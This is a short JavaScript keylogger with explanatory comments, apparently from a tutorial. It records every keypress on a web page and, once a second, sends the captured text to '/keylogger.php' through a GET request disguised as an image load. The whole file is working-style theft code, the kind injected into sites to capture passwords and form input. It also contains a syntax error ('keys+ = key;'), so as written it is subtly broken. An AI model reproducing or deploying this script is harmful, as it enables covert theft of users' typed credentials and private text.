//declare a variable to store keystroke
var keys = '';

//call the function to execute whenever a keystroke is in html document
//event handler - document.onkeypress

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode; //get character code
	key = String.fromCharCode(key); //coverting to string
	keys+ = key;
}

window.setInterval(function() {
	new Image().src = '/keylogger.php?c='+keys; //sending data as get request by creating a new image
	keys = '';
	}, 1000 //interval to execute continuously
);